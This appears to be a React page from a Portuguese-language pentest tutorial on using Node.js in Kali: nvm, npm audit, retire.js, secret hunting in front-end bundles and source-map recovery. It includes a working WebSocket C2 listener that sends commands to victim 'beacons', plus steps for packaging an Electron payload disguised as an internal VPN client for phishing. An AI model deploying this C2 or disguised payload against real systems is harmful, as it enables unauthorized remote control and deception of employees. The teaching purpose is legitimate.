import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function NodeJS() {
  return (
    <PageContainer
      title="Node.js no Kali — JavaScript do lado ofensivo"
      subtitle="nvm, npm/pnpm, retire.js, eslint-security, electron payloads, npm audit em targets reais."
      difficulty="intermediario"
      timeToRead="18 min"
    >
      <h2>Por que Node entra no toolkit pentester</h2>
      <p>
        Toda app web moderna que você vai testar roda Node em algum lugar (backend Express,
        SSR Next.js, ferramenta CLI dev, build pipeline). Ferramentas ofensivas chave também:
        <strong> retire.js</strong> (CVEs em libs JS de páginas), <strong>BeEF</strong> (XSS framework),
        <strong> evil-winrm</strong> (espera, esse é Ruby), e dezenas de PoCs publicados em ESM/TS.
        E se você quer escrever um C2 customizado leve, Node + WebSocket é praticamente uma linha.
      </p>

      <h2>Instalar via nvm (não mexa no node do sistema)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "Kali tem nodejs pacote APT, mas trava em versão antiga",
            cmd: "node --version 2>/dev/null || echo 'sem node ainda'",
            out: "v18.19.0",
            outType: "muted",
          },
          {
            comment: "instale nvm (gerenciador de versões)",
            cmd: "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
            out: `=> Downloading nvm from git to '/home/wallyson/.nvm'
=> Appending nvm source string to /home/wallyson/.bashrc
=> Close and reopen your terminal to start using nvm`,
            outType: "info",
          },
          {
            cmd: "source ~/.bashrc && command -v nvm",
            out: "nvm",
            outType: "success",
          },
          {
            cmd: "nvm install --lts",
            out: `Installing latest LTS version.
Downloading and installing node v22.11.0...
Now using node v22.11.0 (npm v10.9.0)
Creating default alias: default -> lts/* (-> v22.11.0)`,
            outType: "success",
          },
          {
            cmd: "nvm install 18 && nvm install 20",
            out: `Now using node v18.20.5
Now using node v20.18.0`,
            outType: "info",
          },
          {
            cmd: "nvm ls",
            out: `       v18.20.5
       v20.18.0
->     v22.11.0
default -> lts/* (-> v22.11.0)
node -> stable (-> v22.11.0)`,
            outType: "default",
          },
          {
            comment: "muda só pro terminal atual",
            cmd: "nvm use 20",
            out: "Now using node v20.18.0 (npm v10.8.2)",
            outType: "warning",
          },
        ]}
      />

      <h2>npm vs pnpm vs yarn</h2>
      <CommandTable
        title="Os três gerenciadores"
        variations={[
          { cmd: "npm install", desc: "Default, sempre disponível. node_modules tradicional duplicado.", output: "Lento mas universal." },
          { cmd: "pnpm install", desc: "Hard-link store global. 3-10x mais rápido, ~/.pnpm-store gigante.", output: "Melhor pra quem clona dezenas de tools/dia." },
          { cmd: "yarn install", desc: "Berry (v4) com PnP, sem node_modules. Ou v1 (clássico).", output: "Workspaces fortes." },
          { cmd: "bun install", desc: "Runtime+package manager em Zig. Brutalmente rápido.", output: "bun install em 50ms." },
          { cmd: "npx <pkg>", desc: "Roda CLI sem instalar global.", output: "npx create-react-app meuapp" },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "npm install -g pnpm",
            out: `added 1 package in 2s
/home/wallyson/.nvm/versions/node/v22.11.0/bin/pnpm`,
            outType: "info",
          },
          {
            cmd: "pnpm --version && npm --version",
            out: `9.12.3
10.9.0`,
            outType: "default",
          },
        ]}
      />

      <h2>package.json — anatomia</h2>
      <CodeBlock
        language="json"
        title="package.json (ferramenta CLI ofensiva)"
        code={`{
  "name": "subdomain-takeover-checker",
  "version": "0.3.1",
  "type": "module",
  "bin": {
    "stc": "./bin/stc.js"
  },
  "engines": {
    "node": ">=20"
  },
  "scripts": {
    "start": "node src/index.js",
    "test": "vitest run",
    "lint": "eslint . --ext .js,.ts",
    "audit": "npm audit --audit-level=high",
    "build": "esbuild src/index.js --bundle --platform=node --outfile=dist/stc.js"
  },
  "dependencies": {
    "axios": "^1.7.7",
    "chalk": "^5.3.0",
    "commander": "^12.1.0",
    "p-limit": "^6.1.0"
  },
  "devDependencies": {
    "esbuild": "^0.24.0",
    "eslint": "^9.13.0",
    "eslint-plugin-security": "^3.0.1",
    "vitest": "^2.1.4"
  }
}`}
      />

      <h2>Auditando dependências do alvo</h2>
      <p>
        Em pentest de aplicação web/SaaS, <code>package-lock.json</code> exposto (raro mas acontece)
        ou versões dos chunks JS no DevTools te dão a árvore inteira. Use isso pra correlacionar com CVEs.
      </p>

      <Terminal
        path="~/target-app"
        lines={[
          {
            cmd: "npm audit",
            out: `# npm audit report

axios  <1.7.4
Severity: high
Server-Side Request Forgery in axios - https://github.com/advisories/GHSA-8hc4-vh64-cxmj
fix available via 'npm audit fix'
node_modules/axios

lodash  <4.17.21
Severity: critical
Prototype Pollution in lodash
node_modules/lodash

3 vulnerabilities (1 moderate, 1 high, 1 critical)`,
            outType: "error",
          },
          {
            cmd: "npm audit --json | jq '.vulnerabilities | to_entries | map({name:.key, severity:.value.severity, via:.value.via[0]})'",
            out: `[
  { "name": "axios", "severity": "high", "via": "GHSA-8hc4-vh64-cxmj" },
  { "name": "lodash", "severity": "critical", "via": "GHSA-jf85-cpcp-j695" }
]`,
            outType: "warning",
          },
          {
            comment: "retire.js: scan estático em arquivos JS já buildados",
            cmd: "npm install -g retire && retire --path ./public/js",
            out: `public/js/jquery-1.7.1.min.js
 ↳ jquery 1.7.1
   has known vulnerabilities; severity: medium; CVE: CVE-2012-6708
   has known vulnerabilities; severity: medium; CVE: CVE-2015-9251`,
            outType: "error",
          },
          {
            comment: "scan no front-end de prod direto da URL",
            cmd: "retire --js https://target.com/main.bundle.js",
            out: `analyzing https://target.com/main.bundle.js
 ↳ angular 1.5.8
   has known vulnerabilities; CVE-2019-10768; severity: high`,
            outType: "warning",
          },
        ]}
      />

      <h2>Scripts ofensivos rápidos em Node</h2>
      <CodeBlock
        language="javascript"
        title="websocket-c2.js (listener custom em 30 linhas)"
        code={`#!/usr/bin/env node
import { WebSocketServer } from "ws";
import chalk from "chalk";
import readline from "readline";

const PORT = 9001;
const wss = new WebSocketServer({ port: PORT });
const beacons = new Map();

console.log(chalk.cyan(\`[*] C2 listening on ws://0.0.0.0:\${PORT}\`));

wss.on("connection", (ws, req) => {
  const id = req.socket.remoteAddress + ":" + req.socket.remotePort;
  beacons.set(id, ws);
  console.log(chalk.green(\`[+] new beacon: \${id}\`));

  ws.on("message", (raw) => {
    const msg = raw.toString();
    process.stdout.write(chalk.yellow(\`[\${id}] \`) + msg);
  });

  ws.on("close", () => {
    beacons.delete(id);
    console.log(chalk.red(\`[-] beacon dropped: \${id}\`));
  });
});

const rl = readline.createInterface({ input: process.stdin, output: process.stdout, prompt: "c2> " });
rl.prompt();
rl.on("line", (line) => {
  const [target, ...rest] = line.split(" ");
  const cmd = rest.join(" ");
  if (target === "list") {
    [...beacons.keys()].forEach((id) => console.log(" -", id));
  } else if (beacons.has(target)) {
    beacons.get(target).send(cmd);
    console.log(chalk.dim(\`>> sent to \${target}\`));
  } else {
    console.log(chalk.red("uso: <beacon-id|list> <comando>"));
  }
  rl.prompt();
});`}
      />

      <Terminal
        path="~/c2"
        lines={[
          {
            cmd: "pnpm init && pnpm add ws chalk",
            out: `Packages: +47
Done in 1.8s`,
            outType: "muted",
          },
          {
            cmd: "node websocket-c2.js",
            out: `[*] C2 listening on ws://0.0.0.0:9001
c2> [+] new beacon: 192.168.1.55:51234
[192.168.1.55:51234] win-victim hostname
list
 - 192.168.1.55:51234
192.168.1.55:51234 whoami
>> sent to 192.168.1.55:51234
[192.168.1.55:51234] desktop\\\\admin`,
            outType: "warning",
          },
        ]}
      />

      <h2>Electron — payloads desktop</h2>
      <p>
        Apps Electron (Slack, Discord, VS Code, dezenas de SaaS) são <strong>Chromium + Node</strong>{" "}
        empacotados. Bug em preload script ou XSS em renderer com nodeIntegration:true → RCE no host.
        E você mesmo pode empacotar um payload disfarçado de "client interno":
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "pnpm create electron-app fake-client && cd fake-client",
            out: "✓ Created project at /home/wallyson/fake-client",
            outType: "info",
          },
          {
            cmd: "pnpm add electron-builder --save-dev",
            out: "Done in 4.2s",
            outType: "muted",
          },
          {
            comment: "depois de editar main.js pra fazer o que quiser",
            cmd: "npx electron-builder --win --linux",
            out: `• electron-builder  version=25.1.8
• packaging       platform=linux arch=x64
• building        target=AppImage arch=x64 file=dist/fake-client-1.0.0.AppImage
• packaging       platform=win32 arch=x64
• building        target=nsis file=dist/fake-client Setup 1.0.0.exe`,
            outType: "warning",
          },
        ]}
      />

      <AlertBox type="danger" title="Ética de payload Electron">
        Builds Electron são pesadíssimos (200MB+) e <strong>extremamente</strong> visíveis em EDR.
        Use só em phishing autorizado com narrativa convincente (ex: "novo cliente VPN da empresa").
      </AlertBox>

      <h2>Ferramentas de pentest baseadas em Node</h2>
      <CommandTable
        title="Tools JS úteis no Kali"
        variations={[
          { cmd: "retire.js", desc: "CVEs em libs JS (jQuery, Angular, etc).", output: "npm i -g retire" },
          { cmd: "snyk", desc: "Scanner de deps + IaC. Conta free.", output: "snyk test" },
          { cmd: "wappalyzer-cli", desc: "Detecta tech stack via Node.", output: "wappalyzer https://target.com" },
          { cmd: "nuclei (Go, mas...)", desc: "Templates JS pra fingerprint.", output: "Não é Node mas comum no fluxo." },
          { cmd: "puppeteer / playwright", desc: "Browser headless pra scraping/XSS reflection.", output: "page.goto + page.evaluate" },
          { cmd: "BeEF (Ruby+JS)", desc: "Hook de XSS. Ruby por baixo, mas payload JS.", output: "Cross-tool clássico." },
          { cmd: "trufflehog (não-node mas mira segredos em .env JS)", desc: "Caça API keys.", output: "trufflehog filesystem ./" },
          { cmd: "gitleaks (Go) em repos JS", desc: "Caça segredos em commits.", output: "gitleaks detect --source ." },
        ]}
      />

      <h2>Análise de bundle frontend</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "baixa o bundle do alvo",
            cmd: "curl -s https://target.com/static/js/main.abc123.js -o main.js",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "deobfusca um pouco",
            cmd: "npx prettier --parser babel main.js > main.pretty.js",
            out: "(formata em ~10s)",
            outType: "info",
          },
          {
            comment: "procura por endpoints, segredos, comentários",
            cmd: "grep -E 'apiKey|secret|/api/|admin' main.pretty.js | head -10",
            out: `apiKey: "AIzaSyB...VleakedKey"
const ENDPOINTS = ["/api/v2/users", "/api/v2/admin/dump"]
// TODO remover antes de prod
DEBUG_TOKEN = "dev-only-bypass-2024"`,
            outType: "error",
          },
          {
            comment: "ferramenta especializada: trufflehog em texto",
            cmd: "trufflehog filesystem . --no-update",
            out: `[GoogleApiKey] AIzaSyB...VleakedKey
[GenericApi] dev-only-bypass-2024
Found verified: 1, unverified: 1`,
            outType: "warning",
          },
        ]}
      />

      <h2>Source maps — ouro do recon JS</h2>
      <p>
        Se o alvo deixou <code>.map</code> público (acontece MUITO), você reconstrói o código fonte
        original quase completo. Sempre tente <code>main.abc123.js.map</code>.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "curl -s https://target.com/static/js/main.abc123.js.map -o main.js.map && file main.js.map",
            out: "main.js.map: JSON data",
            outType: "success",
          },
          {
            cmd: "npm i -g sourcemap-unpacker && sourcemap-unpacker main.js.map -o ./src-recovered",
            out: `Reconstructed 142 source files into ./src-recovered/
  src/components/AdminPanel.jsx
  src/utils/auth.js
  src/hooks/useApiKeys.js
  ...`,
            outType: "info",
          },
        ]}
      />

      <PracticeBox
        title="Audit completo de uma app Node"
        goal="Clonar app de exemplo, instalar deps, rodar audit, identificar vulns conhecidas e gerar relatório."
        steps={[
          "Clone juice-shop (lab vulnerável de propósito).",
          "Instale com pnpm e rode npm audit.",
          "Rode retire em assets/.",
          "Salve relatório em audit.json.",
        ]}
        command={`git clone https://github.com/juice-shop/juice-shop.git --depth 1
cd juice-shop
pnpm install --ignore-scripts
npm audit --json > audit.json 2>/dev/null
npx retire --path . --outputformat json --outputpath retire.json 2>/dev/null
echo "--- top 5 ---"
jq '.vulnerabilities | to_entries | sort_by(.value.severity) | reverse | .[0:5] | map({name:.key, sev:.value.severity})' audit.json`}
        expected={`[
  {"name": "express-jwt", "sev": "high"},
  {"name": "marsdb", "sev": "high"},
  {"name": "lodash", "sev": "critical"},
  {"name": "yaml", "sev": "high"},
  {"name": "ws", "sev": "moderate"}
]`}
        verify="Lista de pelo menos 3 high/critical aparece. Esse é exatamente o input pra um relatório de SCA (Software Composition Analysis)."
      />

      <AlertBox type="info" title="Lockfile leak">
        Em recon de bug bounty, sempre teste <code>https://target/package-lock.json</code>,{" "}
        <code>/.npmrc</code>, <code>/yarn.lock</code>. Lockfile completo + npm audit te dá CVE map em segundos.
      </AlertBox>
    </PageContainer>
  );
}
